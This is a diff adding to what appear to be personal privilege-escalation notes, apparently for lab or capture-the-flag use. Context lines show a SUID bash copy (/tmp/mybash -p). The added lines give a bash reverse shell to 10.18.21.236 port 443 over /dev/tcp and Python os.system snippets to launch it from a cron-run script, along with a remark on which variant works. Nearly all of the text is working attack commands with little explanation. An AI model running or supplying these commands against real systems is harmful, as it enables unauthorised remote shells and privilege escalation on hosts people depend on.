@@ -26,3 +26,28 @@ chmod +xs /tmp/mybash
 chmod +x /home/user/whatever.sh
 /tmp/mybash -p
 
+---
+alternative
+
+nano revsh.sh
+```sh
+#!/bin/bash
+bash -i >& /dev/tcp/10.18.21.236/443 0>&1
+```
+in python code run by system (like crontab)
+```python
+import os
+
+os.system("touch /tmp/testfile")
+os.system("bash /tmp/revsh.sh")
+```
+
+---
+in python
+```python
+import os
+
+os.system("touch /tmp/testfile9")
+os.system("echo 'bash -i >& /dev/tcp/10.18.21.236/443 0>&1'|bash")
+```
+observe: os.system("bash -i >& /dev/tcp/10.18.21.236/443 0>&1") may not work but the above does, funny
